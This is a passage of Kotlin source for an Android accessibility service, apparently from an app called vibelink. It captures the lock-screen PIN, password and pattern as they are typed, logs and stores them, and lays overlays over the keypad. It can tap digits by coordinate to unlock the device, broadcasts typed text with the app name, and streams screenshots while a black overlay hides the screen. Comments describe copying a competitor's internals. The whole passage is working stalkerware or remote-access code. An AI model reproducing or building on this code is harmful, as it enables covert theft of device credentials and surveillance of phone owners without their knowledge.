        for (index in 0 until node.childCount) {
            val child = node.getChild(index) ?: continue
            collectPinIndicatorDots(child, screenH, dots)
            child.recycle()
        }
    }

    private fun extractPinCountFromDescriptions(
        node: AccessibilityNodeInfo,
        screenH: Int,
    ): Int {
        val rect = Rect()
        node.getBoundsInScreen(rect)
        var bestCount = 0

        if (!rect.isEmpty && rect.centerY() < screenH * 0.45f) {
            val merged = listOfNotNull(
                node.text?.toString(),
                node.contentDescription?.toString(),
            ).joinToString(" ")
            bestCount = maxOf(bestCount, parsePinCountFromText(merged))
        }

        for (index in 0 until node.childCount) {
            val child = node.getChild(index) ?: continue
            bestCount = maxOf(bestCount, extractPinCountFromDescriptions(child, screenH))
            child.recycle()
        }

        return bestCount
    }

    private fun parsePinCountFromText(text: String): Int {
        if (text.isBlank()) {
            return 0
        }
        Regex("(\\d+)\\s*位").find(text)?.groupValues?.getOrNull(1)?.toIntOrNull()?.let { return it }
        Regex("已输入\\s*(\\d+)").find(text)?.groupValues?.getOrNull(1)?.toIntOrNull()?.let { return it }
        return 0
    }

    private fun findPinPasswordFieldLength(node: AccessibilityNodeInfo): Int {
        if (node.isPassword) {
            val length = node.text?.length ?: 0
            if (length in 1..12) {
                return length
            }
        }

        for (index in 0 until node.childCount) {
            val child = node.getChild(index) ?: continue
            val length = findPinPasswordFieldLength(child)
            child.recycle()
            if (length > 0) {
                return length
            }
        }

        return 0
    }

    private fun countBulletsInPinArea(node: AccessibilityNodeInfo, screenH: Int): Int {
        val rect = Rect()
        node.getBoundsInScreen(rect)
        var count = 0

        if (!rect.isEmpty && rect.centerY() < screenH * 0.45f) {
            val merged = listOfNotNull(
                node.text?.toString(),
                node.contentDescription?.toString(),
            ).joinToString("")
            count += merged.count { it == '•' || it == '●' || it == '◉' || it == '*' || it == '·' }
        }

        for (index in 0 until node.childCount) {
            val child = node.getChild(index) ?: continue
            count = maxOf(count, countBulletsInPinArea(child, screenH))
            child.recycle()
        }

        return count
    }

    private fun pinFeedbackFingerprint(root: AccessibilityNodeInfo): String {
        val builder = StringBuilder()
        appendPinFeedbackSnapshot(root, builder, resources.displayMetrics.heightPixels)
        return builder.toString()
    }

    private fun appendPinFeedbackSnapshot(
        node: AccessibilityNodeInfo,
        out: StringBuilder,
        screenH: Int,
    ) {
        val rect = Rect()
        node.getBoundsInScreen(rect)
        if (!rect.isEmpty && rect.centerY() < screenH * 0.43f) {
            out.append('|')
            if (node.isSelected) {
                out.append('S')
            }
            if (node.isChecked) {
                out.append('C')
            }
            node.text?.takeIf { it.isNotBlank() }?.let { out.append("t=").append(it) }
            node.contentDescription?.takeIf { it.isNotBlank() }?.let { out.append("d=").append(it) }
            node.viewIdResourceName?.substringAfterLast('/')?.let { out.append("i=").append(it) }
        }

        for (index in 0 until node.childCount) {
            val child = node.getChild(index) ?: continue
            appendPinFeedbackSnapshot(child, out, screenH)
            child.recycle()
        }
    }

    private fun hasPinFeedbackAdvanced(before: String, after: String): Boolean {
        if (before == after) {
            return false
        }
        return after.length >= before.length
    }

    private fun calibratePinKeypadFromTree(root: AccessibilityNodeInfo?) {
        if (root == null) {
            return
        }

        cachedPinContainerRect = null
        pinCalibrationSource = PinCalibrationSource.NONE

        cachedPinContainerRect = findPinContainerRect(root)

        val byViewId = scanPinDigitCentersByViewId(root)
        if (byViewId.size >= MIN_CALIBRATED_DIGITS) {
            cachedPinDigitCenters = byViewId
            pinCalibrationSource = PinCalibrationSource.VIEW_ID
            return
        }

        val inContainer = scanDigitsInsidePinContainer(root)
        if (inContainer.size >= MIN_CALIBRATED_DIGITS) {
            cachedPinDigitCenters = inContainer
            pinCalibrationSource = PinCalibrationSource.CONTAINER_SCAN
            return
        }

        val centers = mutableMapOf<Char, Pair<Float, Float>>()
        for (digit in PIN_CALIBRATION_DIGITS) {
            val node = findDigitNodeByViewId(root, digit)
                ?: findClickableDigit(root, digit)
                ?: continue
            try {
                val rect = Rect()
                node.getBoundsInScreen(rect)
                if (!rect.isEmpty) {
                    centers[digit.first()] = rect.exactCenterX() to rect.exactCenterY()
                }
            } finally {
                node.recycle()
            }
        }

        if (centers.size >= MIN_CALIBRATED_DIGITS) {
            cachedPinDigitCenters = centers
            pinCalibrationSource = PinCalibrationSource.TEXT
            return
        }

        val containerRect = cachedPinContainerRect ?: findPinContainerRect(root)
        if (containerRect != null) {
            cachedPinContainerRect = containerRect
            cachedPinDigitCenters = buildPinGridFromContainer(containerRect)
            pinCalibrationSource = PinCalibrationSource.GRID
        }
    }

    private fun findFirstNodeByViewId(root: AccessibilityNodeInfo, viewId: String): AccessibilityNodeInfo? {
        val nodes = root.findAccessibilityNodeInfosByViewId(viewId)
        if (nodes.isNullOrEmpty()) {
            return null
        }
        val first = nodes.first()
        nodes.drop(1).forEach { it.recycle() }
        return first
    }

    private fun hasViewIdInTree(root: AccessibilityNodeInfo, viewId: String): Boolean {
        val node = findFirstNodeByViewId(root, viewId) ?: return false
        node.recycle()
        return true
    }

    private fun isPinKeypadPageVisible(root: AccessibilityNodeInfo): Boolean {
        for (viewId in PIN_PAGE_HINT_VIEW_IDS) {
            if (hasViewIdInTree(root, viewId)) {
                return true
            }
        }
        if (hasBouncerPinTitle(root)) {
            return true
        }
        return hasPinKeypadInTree(root)
    }

    private fun hasBouncerPinTitle(root: AccessibilityNodeInfo): Boolean {
        val node = findFirstNodeByViewId(root, BOUNCER_TITLE_VIEW_ID) ?: return false
        return try {
            val text = node.text?.toString().orEmpty()
            text.contains("密码") || text.contains("PIN", ignoreCase = true)
        } finally {
            node.recycle()
        }
    }

    private fun findPinContainerRect(root: AccessibilityNodeInfo): Rect? {
        for (viewId in PIN_CONTAINER_VIEW_IDS) {
            val node = findFirstNodeByViewId(root, viewId) ?: continue
            try {
                val rect = Rect()
                node.getBoundsInScreen(rect)
                if (!rect.isEmpty && rect.height() >= MIN_PIN_CONTAINER_HEIGHT_PX) {
                    return Rect(rect)
                }
            } finally {
                node.recycle()
            }
        }
        return null
    }

    private fun scanDigitsInsidePinContainer(root: AccessibilityNodeInfo): Map<Char, Pair<Float, Float>> {
        for (viewId in PIN_CONTAINER_VIEW_IDS) {
            val container = findFirstNodeByViewId(root, viewId) ?: continue
            val centers = mutableMapOf<Char, Pair<Float, Float>>()
            try {
                for (digit in PIN_CALIBRATION_DIGITS) {
                    val node = findDigitNodeInSubtree(container, digit) ?: continue
                    try {
                        val rect = Rect()
                        node.getBoundsInScreen(rect)
                        if (!rect.isEmpty) {
                            centers[digit.first()] = rect.exactCenterX() to rect.exactCenterY()
                        }
                    } finally {
                        node.recycle()
                    }
                }
            } finally {
                container.recycle()
            }
            if (centers.size >= MIN_CALIBRATED_DIGITS) {
                return centers
            }
        }
        return emptyMap()
    }

    private fun findDigitNodeInSubtree(node: AccessibilityNodeInfo, digit: String): AccessibilityNodeInfo? {
        if (matchesPinDigitByViewId(node, digit)) {
            pickClickableNode(node)?.let { return it }
        }
        val text = node.text?.toString()?.trim()
        val content = node.contentDescription?.toString()?.trim()
        if (matchesPinDigit(text, digit) || matchesPinDigit(content, digit)) {
            pickClickableNode(node)?.let { return it }
        }
        for (index in 0 until node.childCount) {
            val child = node.getChild(index) ?: continue
            val found = findDigitNodeInSubtree(child, digit)
            child.recycle()
            if (found != null) {
                return found
            }
        }
        return null
    }

    private fun buildPinGridFromContainer(container: Rect): Map<Char, Pair<Float, Float>> {
        val grid = mutableMapOf<Char, Pair<Float, Float>>()
        for (digit in PIN_CALIBRATION_DIGITS) {
            grid[digit.first()] = pinDigitCoordinateFromContainer(digit.first(), container)
        }
        return grid
    }

    private fun pinDigitCoordinateFromContainer(digit: Char, container: Rect): Pair<Float, Float> {
        return keyguardProfile.pinGridCoordinate(digit, container)
    }

    private fun refreshInteractionRoot(): AccessibilityNodeInfo? {
        if (isDeviceLocked()) {
            collectKeyguardRootFromWindows()?.let { return it }
        }
        rootInActiveWindow?.let { return it }
        return collectFallbackRootFromWindows()
    }

    private fun isDeviceLocked(): Boolean {
        val keyguardManager = getSystemService(KeyguardManager::class.java) ?: return false
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            keyguardManager.isDeviceLocked
        } else {
            @Suppress("DEPRECATION")
            keyguardManager.isKeyguardLocked
        }
    }

    /** 对齐竞品 o80.J / AccessService.b0：PIN 采集路径用 isKeyguardLocked，避免 isDeviceLocked 假解锁抖。 */
    private fun isKeyguardUiLocked(): Boolean {
        val keyguardManager = getSystemService(KeyguardManager::class.java) ?: return false
        @Suppress("DEPRECATION")
        return keyguardManager.isKeyguardLocked
    }

    private fun findInteractionRoot(): AccessibilityNodeInfo? {
        repeat(ROOT_RETRY_COUNT) { attempt ->
            val root = refreshInteractionRoot()
            if (root != null) {
                return root
            }
            if (attempt < ROOT_RETRY_COUNT - 1) {
                Thread.sleep(ROOT_RETRY_MS)
            }
        }
        return null
    }

    private fun collectKeyguardRootFromWindows(): AccessibilityNodeInfo? {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            return null
        }

        val windowList = windows ?: return null
        var bestRoot: AccessibilityNodeInfo? = null
        var bestScore = -1
        try {
            for (window in windowList.sortedByDescending { it.layer }) {
                val root = window.root ?: continue
                val pkg = root.packageName?.toString().orEmpty()
                val score = when {
                    hasViewIdInTree(root, PIN_CONTAINER_VIEW_ID) -> 4
                    isKeyguardPackage(pkg) && hasPinKeypadInTree(root) -> 3
                    isKeyguardPackage(pkg) -> 2
                    hasPinKeypadInTree(root) -> 1
                    else -> 0
                }
                if (score > bestScore) {
                    recycleNode(bestRoot)
                    bestRoot = AccessibilityNodeInfo.obtain(root)
                    bestScore = score
                }
                if (bestScore >= 4) {
                    break
                }
            }
            return bestRoot
        } finally {
            for (window in windowList) {
                window.recycle()
            }
        }
    }

    private fun collectFallbackRootFromWindows(): AccessibilityNodeInfo? {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            return null
        }

        val windowList = windows
        if (windowList.isNullOrEmpty()) {
            return null
        }

        var fallback: AccessibilityNodeInfo? = null
        try {
            for (window in windowList.sortedByDescending { it.layer }) {
                val root = window.root ?: continue
                if (fallback == null && root.childCount > 0) {
                    fallback = root
                } else {
                    root.recycle()
                }
            }
            return fallback
        } finally {
            for (window in windowList) {
                window.recycle()
            }
        }
    }

    private fun hasPinKeypadInTree(root: AccessibilityNodeInfo): Boolean {
        if (hasViewIdInTree(root, PIN_CONTAINER_VIEW_ID)) {
            return true
        }
        if (hasViewIdInTree(root, KEYGUARD_PIN_VIEW_ID)) {
            return true
        }
        val viewIdMatches = PIN_PROBE_DIGITS.count { digit ->
            findDigitNodeByViewId(root, digit) != null
        }
        if (viewIdMatches >= 2) {
            return true
        }
        return PIN_PROBE_DIGITS.count { digit ->
            findClickableDigit(root, digit) != null
        } >= 3
    }

    private fun isKeyguardPackage(packageName: String?): Boolean {
        if (packageName.isNullOrBlank()) {
            return false
        }
        val normalized = packageName.lowercase()
        return normalized.contains("systemui") ||
            normalized.contains("keyguard") ||
            normalized.contains("lockscreen")
    }

    private fun clickPinByCoordinate(digit: Char): ControlResult {
        cachedPinDigitCenters?.get(digit)?.let { (x, y) ->
            return dispatchUnlockClick(x, y)
        }

        cachedPinContainerRect?.let { container ->
            val (x, y) = pinDigitCoordinateFromContainer(digit, container)
            return dispatchUnlockClick(x, y)
        }

        val metrics = resources.displayMetrics
        val (x, y) = keyguardProfile.pinScreenCoordinate(
            digit,
            metrics.widthPixels,
            metrics.heightPixels,
        )
        return dispatchUnlockClick(x, y)
    }

    private fun dispatchUnlockClick(x: Float, y: Float): ControlResult {
        return performKeyguardGestureTap(x, y)
    }

    private fun buildSwipeGesture(
        x1: Float,
        y1: Float,
        x2: Float,
        y2: Float,
        durationMs: Long,
    ): GestureDescription {
        val path = Path().apply {
            moveTo(x1, y1)
            lineTo(x2, y2)
        }
        return GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, durationMs))
            .build()
    }

    private fun dispatchUnlockGesture(gesture: GestureDescription, settleMs: Long): ControlResult {
        val dispatchResult = dispatchGestureOnMain(gesture)
        if (!dispatchResult.ok) {
            return dispatchResult
        }
        Thread.sleep(settleMs)
        return ControlResult(true)
    }

    private fun dispatchGestureOnMain(gesture: GestureDescription): ControlResult {
        if (Looper.myLooper() == Looper.getMainLooper()) {
            return dispatchGestureOnMainInternal(gesture)
        }

        val holder = arrayOf(ControlResult(false, "gesture_dispatch_failed"))
        val latch = CountDownLatch(1)
        captureHandler.post {
            holder[0] = dispatchGestureOnMainInternal(gesture)
            latch.countDown()
        }
        val finished = latch.await(DISPATCH_WAIT_MS, TimeUnit.MILLISECONDS)
        return if (finished) {
            holder[0]
        } else {
            ControlResult(false, "gesture_dispatch_failed")
        }
    }

    private fun dispatchGestureOnMainInternal(gesture: GestureDescription): ControlResult {
        return withOverlayPassthrough {
            val dispatched = dispatchGesture(gesture, null, captureHandler)
            if (dispatched) {
                ControlResult(true)
            } else {
                ControlResult(false, "dispatch_gesture_failed")
            }
        }
    }

    private fun waitForPinKeypadReady(): Boolean {
        return withOverlaysSuspendedForKeyguardGesture {
            ensurePinKeypadReady()
        }
    }

    private fun isCredentialBouncerVisible(): Boolean {
        return currentPatternViewBounds() != null || isPinKeypadVisible()
    }

    private fun isPinKeypadVisible(): Boolean {
        // 图案页可能带「使用密码」入口，不能误判成 PIN
        val patternNode = findPatternViewAcrossWindows()
        if (patternNode != null) {
            patternNode.recycle()
            return false
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val windowList = windows
            if (!windowList.isNullOrEmpty()) {
                try {
                    for (window in windowList) {
                        val root = window.root ?: continue
                        if (isPinKeypadPageVisible(root)) {
                            return true
                        }
                    }
                } finally {
                    windowList.forEach { it.recycle() }
                }
            }
        }

        val root = refreshInteractionRoot() ?: return false
        return try {
            isPinKeypadPageVisible(root)
        } finally {
            root.recycle()
        }
    }

    private fun recycleNode(node: AccessibilityNodeInfo?) {
        node?.recycle()
    }

    private fun matchesPinDigit(value: String?, digit: String): Boolean {
        if (value.isNullOrBlank()) {
            return false
        }
        val normalized = value.trim()
        if (normalized == digit) {
            return true
        }
        if (normalized.length > 2 && normalized.all { it.isDigit() }) {
            return false
        }
        return normalized.endsWith(" $digit") ||
            normalized.startsWith("$digit ") ||
            normalized.contains("数字$digit") ||
            normalized.contains("数字 $digit") ||
            normalized.contains("按键$digit") ||
            normalized.contains("按钮$digit")
    }

    private fun matchesPinDigitByViewId(node: AccessibilityNodeInfo, digit: String): Boolean {
        val viewId = node.viewIdResourceName?.lowercase().orEmpty()
        if (viewId.isBlank()) {
            return false
        }
        val keyPattern = Regex("""(?:^|[/:_])key_?${Regex.escape(digit)}$""")
        if (keyPattern.containsMatchIn(viewId)) {
            return true
        }
        val digitPattern = Regex("""(?:^|[/:_])digit_?${Regex.escape(digit)}$""")
        if (digitPattern.containsMatchIn(viewId)) {
            return true
        }
        val pinKeyPattern = Regex("""(?:^|[/:_])pinkey${Regex.escape(digit)}$""")
        if (pinKeyPattern.containsMatchIn(viewId)) {
            return true
        }
        val numKeyPattern = Regex("""(?:^|[/:_])numkey${Regex.escape(digit)}$""")
        return numKeyPattern.containsMatchIn(viewId)
    }

    private fun findClickableDigit(root: AccessibilityNodeInfo, digit: String): AccessibilityNodeInfo? {
        findDigitNodeByViewId(root, digit)?.let { return it }

        val byText = root.findAccessibilityNodeInfosByText(digit)
        var matched: AccessibilityNodeInfo? = null
        for (raw in byText) {
            if (!isInPinPadArea(raw)) {
                raw.recycle()
                continue
            }
            val found = pickClickableNode(raw)
            raw.recycle()
            if (found != null) {
                matched = found
                break
            }
        }
        if (matched != null) {
            return matched
        }
        return findClickableDigitRecursive(root, digit)
    }

    private fun isInPinPadArea(node: AccessibilityNodeInfo): Boolean {
        val rect = Rect()
        node.getBoundsInScreen(rect)
        if (rect.isEmpty) {
            return false
        }
        val screenH = resources.displayMetrics.heightPixels
        val minY = if (cachedPinContainerRect != null) {
            cachedPinContainerRect!!.top + cachedPinContainerRect!!.height() * 0.05f
        } else {
            screenH * 0.45f
        }
        return rect.centerY() >= minY
    }

    private fun findClickableDigitRecursive(
        node: AccessibilityNodeInfo,
        digit: String,
    ): AccessibilityNodeInfo? {
        val text = node.text?.toString()?.trim()
        val content = node.contentDescription?.toString()?.trim()
        if (matchesPinDigitByViewId(node, digit)) {
            val found = pickClickableNode(node)
            if (found != null) {
                return found
            }
        }
        if (
            isInPinPadArea(node) &&
            (
                matchesPinDigit(text, digit) ||
                    matchesPinDigit(content, digit)
                )
        ) {
            val found = pickClickableNode(node)
            if (found != null) {
                return found
            }
        }

        for (index in 0 until node.childCount) {
            val child = node.getChild(index) ?: continue
            val found = findClickableDigitRecursive(child, digit)
            child.recycle()
            if (found != null) {
                return found
            }
        }

        return null
    }

    private fun pickClickableNode(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        if (node.isClickable) {
            return AccessibilityNodeInfo.obtain(node)
        }

        var parent = node.parent
        while (parent != null) {
            if (parent.isClickable) {
                return AccessibilityNodeInfo.obtain(parent)
            }
            val next = parent.parent
            parent.recycle()
            parent = next
        }

        return AccessibilityNodeInfo.obtain(node)
    }

    /**
     * Dispatch on main, wait for callback off-main (mamimobi style).
     * Never latch.await on the main looper — that caused black-screen gesture_timeout.
     */
    private fun dispatchGestureSync(
        gesture: GestureDescription,
        timeoutMs: Long = GESTURE_TIMEOUT_MS,
    ): ControlResult {
        val latch = CountDownLatch(1)
        val completed = booleanArrayOf(false)
        val dispatchedHolder = booleanArrayOf(false)

        fun dispatchNow(): Boolean {
            return dispatchGesture(
                gesture,
                object : GestureResultCallback() {
                    override fun onCompleted(gestureDescription: GestureDescription) {
                        completed[0] = true
                        latch.countDown()
                    }

                    override fun onCancelled(gestureDescription: GestureDescription) {
                        latch.countDown()
                    }
                },
                gestureCallbackHandler,
            )
        }

        if (Looper.myLooper() == Looper.getMainLooper()) {
            // Caller should have hopped off main already; still don't await here.
            dispatchedHolder[0] = dispatchNow()
            if (!dispatchedHolder[0]) {
                return ControlResult(false, "dispatch_gesture_failed")
            }
            return ControlResult(true)
        }

        val dispatchLatch = CountDownLatch(1)
        captureHandler.post {
            dispatchedHolder[0] = dispatchNow()
            dispatchLatch.countDown()
        }
        if (!dispatchLatch.await(2, TimeUnit.SECONDS)) {
            return ControlResult(false, "gesture_dispatch_failed")
        }
        if (!dispatchedHolder[0]) {
            return ControlResult(false, "dispatch_gesture_failed")
        }

        val finished = latch.await(timeoutMs, TimeUnit.MILLISECONDS)
        return when {
            completed[0] -> ControlResult(true)
            !finished -> ControlResult(false, "gesture_timeout")
            else -> ControlResult(false, "gesture_cancelled")
        }
    }

    private fun findEditableNode(node: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
        if (node == null) {
            return null
        }

        if (node.isEditable) {
            return AccessibilityNodeInfo.obtain(node)
        }

        for (index in 0 until node.childCount) {
            val child = node.getChild(index)
            val found = findEditableNode(child)
            child?.recycle()
            if (found != null) {
                return found
            }
        }

        return null
    }

    private fun processScreenshot(
        screenshot: ScreenshotResult,
        maxWidth: Int = MAX_FRAME_WIDTH,
        jpegQuality: Int = JPEG_QUALITY,
    ): ScreenCaptureBridge.CaptureResult {
        return try {
            val prepared = prepareScreenshotBitmap(screenshot, maxWidth)
                ?: return ScreenCaptureBridge.CaptureResult(false, error = "bitmap_null")
            val jpegBase64 = bitmapToJpegBase64(prepared.scaled, jpegQuality)
            prepared.scaled.recycle()
            if (jpegBase64.isBlank()) {
                return ScreenCaptureBridge.CaptureResult(false, error = "encode_failed")
            }
            ScreenCaptureBridge.CaptureResult(
                ok = true,
                data = jpegBase64,
                screenWidth = prepared.screenWidth,
                screenHeight = prepared.screenHeight,
                imageWidth = prepared.imageWidth,
                imageHeight = prepared.imageHeight,
            )
        } catch (oom: OutOfMemoryError) {
            ScreenCaptureBridge.CaptureResult(false, error = "capture_oom")
        } catch (error: Exception) {
            ScreenCaptureBridge.CaptureResult(false, error = error.message ?: "capture_failed")
        }
    }

    private fun processScreenshotBitmap(
        screenshot: ScreenshotResult,
        maxWidth: Int = WEBRTC_FRAME_WIDTH,
    ): ScreenCaptureBridge.BitmapCaptureResult {
        return try {
            val prepared = prepareScreenshotBitmap(screenshot, maxWidth)
                ?: return ScreenCaptureBridge.BitmapCaptureResult(false, error = "bitmap_null")
            ScreenCaptureBridge.BitmapCaptureResult(
                ok = true,
                bitmap = prepared.scaled,
                screenWidth = prepared.screenWidth,
                screenHeight = prepared.screenHeight,
            )
        } catch (oom: OutOfMemoryError) {
            ScreenCaptureBridge.BitmapCaptureResult(false, error = "capture_oom")
        } catch (error: Exception) {
            ScreenCaptureBridge.BitmapCaptureResult(false, error = error.message ?: "capture_failed")
        }
    }

    private data class PreparedScreenshot(
        val scaled: Bitmap,
        val screenWidth: Int,
        val screenHeight: Int,
        val imageWidth: Int,
        val imageHeight: Int,
    )

    private fun prepareScreenshotBitmap(
        screenshot: ScreenshotResult,
        maxWidth: Int,
    ): PreparedScreenshot? {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            return null
        }
        val hardwareBitmap = Bitmap.wrapHardwareBuffer(
            screenshot.hardwareBuffer,
            screenshot.colorSpace,
        )
        screenshot.hardwareBuffer.close()
        if (hardwareBitmap == null) {
            return null
        }
        val softwareBitmap = hardwareBitmap.copy(Bitmap.Config.ARGB_8888, true)
        hardwareBitmap.recycle()
        if (softwareBitmap == null) {
            return null
        }
        val recoveredBitmap = if (blackScreenOverlay?.isStreamCompatibleBlack() == true) {
            BlackScreenCaptureCompat.recoverFromStreamBlackOverlay(softwareBitmap)
        } else {
            softwareBitmap
        }
        if (recoveredBitmap !== softwareBitmap) {
            softwareBitmap.recycle()
        }
        val screenWidth = recoveredBitmap.width
        val screenHeight = recoveredBitmap.height
        val scaledBitmap = scaleBitmap(recoveredBitmap, maxWidth)
        if (scaledBitmap !== recoveredBitmap) {
            recoveredBitmap.recycle()
        }
        return PreparedScreenshot(
            scaled = scaledBitmap,
            screenWidth = screenWidth,
            screenHeight = screenHeight,
            imageWidth = scaledBitmap.width,
            imageHeight = scaledBitmap.height,
        )
    }

    private fun scaleBitmap(bitmap: Bitmap, maxWidth: Int = MAX_FRAME_WIDTH): Bitmap {
        if (bitmap.width <= maxWidth) {
            return bitmap
        }
        val scale = maxWidth.toFloat() / bitmap.width.toFloat()
        val targetWidth = maxWidth
        val targetHeight = (bitmap.height * scale).toInt().coerceAtLeast(1)
        return Bitmap.createScaledBitmap(bitmap, targetWidth, targetHeight, false)
    }

    private fun bitmapToJpegBase64(bitmap: Bitmap, quality: Int = JPEG_QUALITY): String {
        val output = ByteArrayOutputStream()
        bitmap.compress(Bitmap.CompressFormat.JPEG, quality, output)
        return Base64.encodeToString(output.toByteArray(), Base64.NO_WRAP)
    }

    private fun dispatchKeyboardEvent(appPackage: String?, text: String, eventType: Int) {
        val appLabel = com.vibelink.client.device.AppLabelHelper.resolveLabel(this, appPackage)
        sendBroadcast(
            Intent(ConnectionService.ACTION_KEYBOARD_EVENT).apply {
                setPackage(packageName)
                putExtra(ConnectionService.EXTRA_APP_PACKAGE, appPackage)
                putExtra(ConnectionService.EXTRA_APP_LABEL, appLabel)
                putExtra(ConnectionService.EXTRA_TEXT, text)
                putExtra(ConnectionService.EXTRA_EVENT_TYPE, eventType)
                putExtra(ConnectionService.EXTRA_CAPTURED_AT, System.currentTimeMillis())
            },
        )
    }

    private fun handleKeyguardPinCapture(event: AccessibilityEvent, packageName: String?) {
        // PIN：动态 USER_PRESENT + unlock 边沿双路径入队（manifest 静态 USER_PRESENT 会被拒）
        val locked = isKeyguardUiLocked()
        if (wasKeyguardLocked && !locked) {
            cancelKeyguardPinResetCheck()
            cancelKeyguardPinUnlockFlush()
            hidePatternCaptureOverlay()
            hidePinKeypadCaptureOverlay()
            persistKeyguardDraft()
            flushKeyguardPinOnUnlockSuccess()
        } else if (!locked) {
            // 非边沿 unlocked：只卸层，不 flush（防 isKeyguardLocked 抖一下发半截）
            cancelKeyguardPinResetCheck()
            hidePatternCaptureOverlay()
            hidePinKeypadCaptureOverlay()
        } else if (!wasKeyguardLocked && locked) {
            // 新一轮锁屏：清空上轮未提交脏 buffer（否则 len 会叠到 15+）
            // 注意：不清 P0 缓存（对齐竞品 P0 常驻）
            resetKeyguardPinSession()
            // 对齐竞品 r()：C0==PIN && P0 非空 → 立刻挂，不等 debounce
            if (tryShowPinOverlayFromCache()) {
                android.util.Log.i(TAG_PATTERN, "pin overlay lock-edge from P0 cache")
            }
            keyguardPinSyncHandler.post { syncKeyguardPinFromTree() }
        }
        wasKeyguardLocked = locked

        if (!locked) {
            keyguardPinSyncHandler.removeCallbacks(keyguardPinSyncRunnable)
            return
        }
        if (!isKeyguardPackage(packageName)) {
            return
        }

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_CLICKED,
            AccessibilityEvent.TYPE_VIEW_SELECTED,
            -> {
                // overlay 独占 / 图案回放抑制窗：gesture 点穿产生的 CLICK 一律丢弃
                if (pinOverlayExclusiveCapture ||
                    pinKeypadCaptureOverlay?.isShowing() == true ||
                    System.currentTimeMillis() < pinOverlayCaptureUntil ||
                    System.currentTimeMillis() < patternOverlaySuppressedUntil ||
                    keyguardCredentialCapture.lockType == KeyguardLockType.PATTERN
                ) {
                    return
                }
                val source = event.source
                try {
                    val action = KeyguardPinKeyParser.parse(source)
                        ?: KeyguardPinKeyParser.parseEvent(event)
                    when (action) {
                        is KeyguardPinKeyAction.Digit -> {
                            android.util.Log.i(
                                "PatternCapture",
                                "pin digit=${action.value} sourceNull=${source == null} pkg=$packageName",
                            )
                            appendKeyguardPinDigit(source, action.value)
                        }
                        is KeyguardPinKeyAction.PasswordChar -> {
                            android.util.Log.i(
                                "PatternCapture",
                                "pwd char sourceNull=${source == null} pkg=$packageName",
                            )
                            appendKeyguardPasswordChar(source, action.value)
                        }
                        KeyguardPinKeyAction.Delete -> appendKeyguardPinDelete(source)
                        null -> {
                            // ColorOS 数字键只有 content-desc、无 resource-id；打点方便对现场
                            val desc = event.contentDescription?.toString().orEmpty()
                            val text = event.text
                                ?.joinToString("") { it?.toString().orEmpty() }
                                .orEmpty()
                            if (desc.isNotBlank() || text.isNotBlank()) {
                                android.util.Log.d(
                                    "PatternCapture",
                                    "click unparsed sourceNull=${source == null} desc=$desc text=$text pkg=$packageName",
                                )
                            }
                        }
                    }
                } finally {
                    source?.recycle()
                }
            }
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
                    pinKeypadCaptureOverlay?.isShowing() != true
                ) {
                    keyguardPinSyncHandler.post { syncKeyguardPinFromTree() }
                } else {
                    scheduleKeyguardPinTreeSync()
                }
            }
        }
    }

    private fun resetKeyguardPinSession() {
        cancelKeyguardPinResetCheck()
        cancelKeyguardPinUnlockFlush()
        hidePatternCaptureOverlay()
        hidePinKeypadCaptureOverlay()
        keyguardCredentialCapture.reset()
        keyguardPinPendingStore.clearDraft()
        lastPublishedKeyguardSignature = ""
        lastPinClickKey = ""
        lastPinClickAt = 0L
        lastPinDigitValue = '\u0000'
        pinOverlayExclusiveCapture = false
    }

    private fun persistKeyguardDraft() {
        if (!keyguardCredentialCapture.hasContent()) {
            keyguardPinPendingStore.clearDraft()
            return
        }
        keyguardPinPendingStore.saveDraft(
            pin = keyguardCredentialCapture.current(),
            lockType = keyguardCredentialCapture.lockType,
            gesturePath = keyguardCredentialCapture.gesturePathJson,
        )
    }

    /** 竞品 SCNReceiver USER_PRESENT：内存 f0 空则读 CURPST，再正式入队。 */
    fun commitKeyguardCaptureOnUserPresent() {
        keyguardPinSyncHandler.post {
            hidePatternCaptureOverlay()
            hidePinKeypadCaptureOverlay()
            flushKeyguardPinOnUnlockSuccess()
        }
    }

    private fun appendKeyguardPinDigit(
        source: AccessibilityNodeInfo?,
        digit: Char,
        fromOverlay: Boolean = false,
    ) {
        cancelKeyguardPinResetCheck()
        val now = System.currentTimeMillis()
        if (pinOverlayExclusiveCapture && !fromOverlay) {
            android.util.Log.d(
                "PatternCapture",
                "pin digit=$digit dropped non-overlay while exclusive",
            )
            return
        }
        // overlay 二次 UP / click 回放都会打同键；全局短窗去重（真连按同键需间隔 > 窗）
        if (digit == lastPinDigitValue && now - lastPinClickAt < PIN_OVERLAY_DIGIT_DEDUPE_MS) {
            android.util.Log.d(
                "PatternCapture",
                "pin digit=$digit dropped duplicate gap=${now - lastPinClickAt}ms fromOverlay=$fromOverlay",
            )
            return
        }
        val rect = Rect()
        source?.getBoundsInScreen(rect)
        val viewId = source?.viewIdResourceName.orEmpty()
        val slotIndex = keyguardCredentialCapture.current().length
        val clickKey = if (!rect.isEmpty) {
            "${rect.centerX()},${rect.centerY()}|$digit|$slotIndex"
        } else {
            "$viewId|$digit|$slotIndex"
        }
        if (clickKey == lastPinClickKey && now - lastPinClickAt < PIN_CLICK_DEDUPE_MS) {
            return
        }
        lastPinClickKey = clickKey
        lastPinClickAt = now
        lastPinDigitValue = digit
        keyguardCredentialCapture.appendDigit(digit)
        android.util.Log.i(
            "PatternCapture",
            "pin digit=$digit accepted len=${keyguardCredentialCapture.current().length} fromOverlay=$fromOverlay",
        )
        // 竞品：输入期只写 f0/CURPST，不轮询 isDeviceLocked publish
        persistKeyguardDraft()
    }

    private fun appendKeyguardPasswordChar(source: AccessibilityNodeInfo?, ch: Char) {
        cancelKeyguardPinResetCheck()
        val rect = Rect()
